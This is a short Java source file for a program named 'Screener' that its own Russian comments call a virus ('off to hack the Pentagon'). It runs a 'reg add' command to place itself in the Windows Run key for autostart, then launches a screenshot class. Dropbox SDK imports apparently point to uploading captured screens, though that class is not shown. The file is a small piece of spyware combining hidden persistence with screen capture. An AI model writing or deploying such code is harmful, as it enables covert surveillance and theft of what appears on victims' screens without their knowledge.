import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Main {


    public static void main(String[] args){

        //Пропишем вирус в автозапуск :)
        //Я создал exe-файл инсталлер, так что всё, иду ломать пентагон.
        String title = "Screener";
        String path = "C:\\Program Files (x86)\\Screener\\Screener.exe";
        String cmd = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + title + " /t REG_SZ /d \"" + path;
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e){e.printStackTrace();}

        Screenshoter screenshoter = new Screenshoter();

        screenshoter.run();
    }


}
